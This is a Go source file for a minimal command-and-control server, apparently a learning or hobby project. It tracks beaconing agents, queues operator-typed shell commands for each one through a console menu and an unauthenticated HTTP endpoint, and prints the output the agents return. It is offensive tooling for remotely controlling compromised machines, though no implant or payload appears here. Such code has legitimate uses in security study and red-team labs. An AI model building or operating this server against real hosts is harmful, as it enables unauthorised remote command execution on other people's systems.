package main

import (
	"c2-server/models"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	agents = make(map[string]*models.Agent)
	mu     sync.Mutex
	wg     sync.WaitGroup
)

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	req, err := decodeBeacon(r)
	if err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	mu.Lock()
	defer mu.Unlock()
	agent, exists := agents[req.ID]
	if !exists {
		agent = &models.Agent{
			ID:       req.ID,
			Hostname: req.Hostname,
		}
		agents[req.ID] = agent
	}
	agent.LastSeen = time.Now()

	sendTask(w, agent)

}

func taskHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	var req models.NewTask
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	mu.Lock()
	defer mu.Unlock()

	agent, exists := agents[req.ID]
	if !exists {
		agent = &models.Agent{ID: req.ID, LastSeen: time.Now()}
		agents[req.ID] = agent
	}
	agent.Tasks = append(agent.Tasks, req.Command)

	json.NewEncoder(w).Encode(map[string]string{"status": "task queued"})
}

func answerHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	var ans models.NewAnswer
	if err := json.NewDecoder(r.Body).Decode(&ans); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	mu.Lock()
	defer mu.Unlock()

	fmt.Println(ans.Answer)
}

func decodeBeacon(r *http.Request) (models.NewBeacon, error) {
	var req models.NewBeacon
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		return models.NewBeacon{}, err
	}
	return req, nil
}

func sendTask(w http.ResponseWriter, a *models.Agent) {
	var newTask models.NewTask

	if len(a.Tasks) > 0 {
		newTask.ID = a.ID
		newTask.Command = a.Tasks[0]
		a.Tasks = a.Tasks[1:]
	} else {
		newTask.ID = a.ID
		newTask.Command = ""
	}
	json.NewEncoder(w).Encode(newTask)
}

func addTask() {
	fmt.Print("id -> ")
	var id string
	fmt.Scanln(&id)
	fmt.Print("command -> ")
	var command string
	fmt.Scanln(&command)
	agent, exists := agents[id]
	if !exists {
		agent = &models.Agent{ID: id, LastSeen: time.Now()}
		agents[id] = agent
	}
	agent.Tasks = append(agent.Tasks, command)
}

func printBanner() {
	banner := `
   ______   ______  
  / ____/  / ____/   ____  _  __
 / /      / /       / __ \| |/_/
/ /___   / /___    / /_/ />  <  
\____/   \____/    \____/_/|_|  

          Go C2 Server
---------------------------------
`
	fmt.Println(banner)
}

func printHelp() {
	fmt.Println(" Available commands:")
	fmt.Println("   help      - Show available commands")
	fmt.Println("   agents    - List connected agents")
	fmt.Println("   tasks     - Show queued tasks")
	fmt.Println("   add     - Add task to agent")
	fmt.Println("   exit      - Stop server")
	fmt.Println("---------------------------------")
}

func flushTerminal() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	_ = cmd.Run()
}

func cli() {
	wg.Wait()
	printBanner()
	printHelp()
	for {
		fmt.Print("c2> ")
		var cmd string
		fmt.Scanln(&cmd)
		printBanner()
		switch cmd {
		case "help":
			flushTerminal()
			printHelp()
		case "agents":
			flushTerminal()
			mu.Lock()
			fmt.Println("Agents:")
			for _, a := range agents {
				fmt.Printf(" - ID: %s Hostname: %s  last seen: %s\n", a.ID, a.Hostname, a.LastSeen.Format(time.RFC822))
			}
			mu.Unlock()
		case "tasks":
			flushTerminal()
			mu.Lock()
			fmt.Println("Queued tasks:")
			for id, agent := range agents {
				if len(agent.Tasks) > 0 {
					fmt.Printf("Agent %s -> %s\n", id, strings.Join(agent.Tasks, ", "))
				} else {
					fmt.Printf("Agent %s -> (no tasks)\n", id)
				}
			}
			mu.Unlock()
		case "add":
			flushTerminal()
			mu.Lock()
			addTask()
			mu.Unlock()
		case "exit":
			flushTerminal()
			fmt.Println("Shutting down...")
			os.Exit(0)
		case "":
			continue
		default:
			fmt.Println("Unknown command. Type 'help'.")
		}
	}
}

func runServer() {
	wg.Add(1)
	http.HandleFunc("/beacon", beaconHandler)
	http.HandleFunc("/task", taskHandler)
	http.HandleFunc("/answer", answerHandler)
	fmt.Println("--- Server started on port 5000 ---")
	wg.Done()
	log.Fatal(http.ListenAndServe(":5000", nil))
}

func main() {
	go cli()
	runServer()
}
